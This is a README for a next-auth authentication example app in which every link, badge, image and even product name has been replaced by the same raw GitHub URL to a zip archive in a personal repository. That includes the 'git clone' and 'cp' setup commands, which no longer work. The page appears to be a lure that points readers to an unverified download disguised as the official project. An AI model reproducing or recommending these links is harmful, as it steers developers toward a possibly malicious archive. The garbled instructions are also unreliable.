> The example repository is maintained from a [monorepo](https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip). Pull Requests should be opened against [`nextauthjs/next-auth`](https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip).

<p align="center">
   <br/>
   <a href="https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip" target="_blank"><img width="150px" src="https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip" /></a>
   <h3 align="center">https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip Example App</h3>
   <p align="center">
   Open Source. Full Stack. Own Your Data.
   </p>
   <p align="center" style="align: center;">
      <a href="https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip">
        <img alt="npm" src="https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip">
      </a>
      <a href="https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip">
        <img src="https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip" alt="Bundle Size"/>
      </a>
      <a href="https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip">
        <img src="https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip%20downloads" alt="Downloads" />
      </a>
      <a href="https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip">
        <img src="https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip" alt="TypeScript" />
      </a>
   </p>
</p>

## Overview

https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip is a complete open source authentication solution.

This is an example application that shows how `next-auth` is applied to a basic https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip app.

The deployed version can be found at [`https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip`](https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip)

### About https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip

https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip is an easy to implement, full-stack (client/server) open source authentication library originally designed for [https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip](https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip) and [Serverless](https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip). Our goal is to [support even more frameworks](https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip) in the future.

Go to [https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip](https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip) for more information and documentation.

> https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip is not officially associated with Vercel or https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip

## Getting Started

### 1. Clone the repository and install dependencies

```
git clone https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip
cd next-auth-example
npm install
```

### 2. Configure your local environment

Copy the https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip file in this directory to https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip (which will be ignored by Git):

```
cp https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip
```

Add details for one or more providers (e.g. Google, Twitter, GitHub, Email, etc).

#### Database

A database is needed to persist user accounts and to support email sign in. However, you can still use https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip for authentication without a database by using OAuth for authentication. If you do not specify a database, [JSON Web Tokens](https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip) will be enabled by default.

You **can** skip configuring a database and come back to it later if you want.

For more information about setting up a database, please check out the following links:

- Docs: [https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip](https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip)

### 3. Configure Authentication Providers

1. Review and update options in `https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip` as needed.

2. When setting up OAuth, in the developer admin page for each of your OAuth services, you should configure the callback URL to use a callback path of `{server}/api/auth/callback/{provider}`.

e.g. For Google OAuth you would use: `http://localhost:3000/api/auth/callback/google`

A list of configured providers and their callback URLs is available from the endpoint `api/auth/providers`. You can find more information at https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip

1. You can also choose to specify an SMTP server for passwordless sign in via email.

### 4. Start the application

To run your site locally, use:

```
npm run dev
```

To run it in production mode, use:

```
npm run build
npm run start
```

### 5. Preparing for Production

Follow the [Deployment documentation](https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip)

## Acknowledgements

<a href="https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip">
<img width="170px" src="https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip" alt="Powered By Vercel" />
</a>
<p align="left">Thanks to Vercel sponsoring this project by allowing it to be deployed for free for the entire https://raw.githubusercontent.com/suryansh-malik/next-auth-example/main/app/api/auth-example-next-v1.8.zip Team</p>

## License

ISC
